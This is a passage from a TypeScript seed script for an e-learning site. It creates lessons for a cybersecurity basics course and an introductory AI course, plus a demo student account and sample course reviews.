  addLesson({ moduleId: m5b.id, courseId: c5.id, title: "Security Policies & Best Practices", type: "text", videoUrl: "", content: "## Security starts with people\n\n### Essential policies\n- **Password policy** — minimum 12 characters\n- **Access control** — principle of least privilege\n- **Data classification** — public, internal, confidential, restricted\n- **Incident response plan**\n\n### Best practices\n- Enable Multi-Factor Authentication (MFA)\n- Keep all software updated\n- Train employees on phishing awareness\n- Backup data regularly\n- Encrypt sensitive data", duration: 35 });

    } // end cyber security essentials guard
    if (!existingTitles.includes("introduction to artificial intelligence")) {
  const c6 = createCourse({
    title: "Introduction to Artificial Intelligence",
    categoryId: "cat-ai",
    description: "Discover the world of AI — from machine learning and neural networks to real-world applications. Learn how AI is transforming industries and how you can get started building AI solutions.",
    coverImage: "", price: 4500, published: true, instructorId,
    level: "Beginner" as const, language: "English",
  });
  const m6a = createModule(c6.id, "Understanding AI");
  addLesson({ moduleId: m6a.id, courseId: c6.id, title: "What is Artificial Intelligence?", type: "text", videoUrl: "", content: "# What is Artificial Intelligence?\n\nAI is the ability of a computer system to perform tasks that typically require human intelligence.\n\n## Types of AI\n\n### 1. Narrow AI (ANI)\n- Siri, Alexa (voice assistants)\n- Spam filters\n- Recommendation systems\n- ChatGPT, Claude\n\n### 2. General AI (AGI)\nA machine with human-level intelligence across any task. Does not exist yet.\n\n### 3. Superintelligent AI (ASI)\nA machine that surpasses human intelligence. Purely theoretical.\n\n> **All AI today is Narrow AI.**", duration: 25, preview: true });
  addLesson({ moduleId: m6a.id, courseId: c6.id, title: "AI, Machine Learning & Deep Learning — What's the Difference?", type: "text", videoUrl: "", content: "# The AI Hierarchy\n\nAI ⊃ Machine Learning ⊃ Deep Learning\n\n## Machine Learning (ML)\nA subset of AI where machines learn patterns from data.\n\n### Three types:\n1. **Supervised Learning** — learn from labeled examples\n2. **Unsupervised Learning** — find patterns in unlabeled data\n3. **Reinforcement Learning** — learn by trial and error\n\n## Deep Learning (DL)\nA subset of ML using neural networks with many layers.\n\n### Powers:\n- Image recognition\n- Natural language processing (ChatGPT)\n- Speech recognition\n- Autonomous vehicles\n- Generative AI", duration: 30, preview: true });
  const m6b = createModule(c6.id, "How Machine Learning Works");
  addLesson({ moduleId: m6b.id, courseId: c6.id, title: "The Machine Learning Workflow", type: "text", videoUrl: "", content: "# The ML Workflow\n\n1. **Define the Problem** — What are you trying to predict?\n2. **Collect Data** — quality + quantity matter\n3. **Prepare Data** — clean, transform, split (80/20)\n4. **Choose a Model** — classification, regression, clustering\n5. **Train** — feed training data to the algorithm\n6. **Evaluate** — test on unseen data (accuracy, precision, recall)\n7. **Deploy & Monitor** — put into production\n\n> Models can degrade over time as real-world data changes (data drift).", duration: 40 });
  addLesson({ moduleId: m6b.id, courseId: c6.id, title: "Training, Testing & Overfitting", type: "text", videoUrl: "", content: "# Training vs Testing\n\n## The Golden Rule\n**Never test on your training data.**\n\n## Overfitting\nA model that memorizes training data but fails on new data.\n\n### Prevention:\n1. More data\n2. Simpler model\n3. Regularization\n4. Cross-validation\n5. Early stopping\n6. Dropout (deep learning)\n\n## Underfitting\nA model too simple to capture patterns.\n\n## The Sweet Spot 🎯\nA model that generalizes well — captures patterns without memorizing noise.", duration: 35 });

    } // end introduction to artificial intelligence guard
  // Add demo student and reviews (only if not already present)
  if (!readDB().users.some(u => u.id === "demo-student-1")) {
  // 4. Demo reviews
  mutate((d) => {
    const studentId = "demo-student-1";
    d.users.push({
      id: studentId, name: "Sarah Kimani", email: "sarah@example.com",
      passwordHash: bcrypt.hashSync("demo", 10), role: "student" as const,
      bio: "", avatar: "", title: "", createdAt: nowISO(),
    });
    d.reviews.push(
      { id: uid(), courseId: c1.id, userId: studentId, rating: 5, comment: "Excellent course! Very clear explanations and practical examples. Perfect for beginners.", createdAt: nowISO() },
      { id: uid(), courseId: c2.id, userId: studentId, rating: 5, comment: "Loved the hands-on approach. The instructor explains complex topics in a way that's easy to understand.", createdAt: nowISO() },
      { id: uid(), courseId: c3.id, userId: studentId, rating: 4, comment: "Great introduction to networking. Would love to see more advanced content in a follow-up course.", createdAt: nowISO() },
      { id: uid(), courseId: c6.id, userId: studentId, rating: 5, comment: "Brilliant introduction to AI! The workflow lesson made machine learning finally click for me. Highly recommend.", createdAt: nowISO() },
    );
  });

  } // end demo student guard
  console.log("[autoseed] Done! 8 courses, 7 categories, reviews created.");
  } catch (err) {
    console.error("[autoseed] Error during seeding (non-fatal):", err);
  }
}
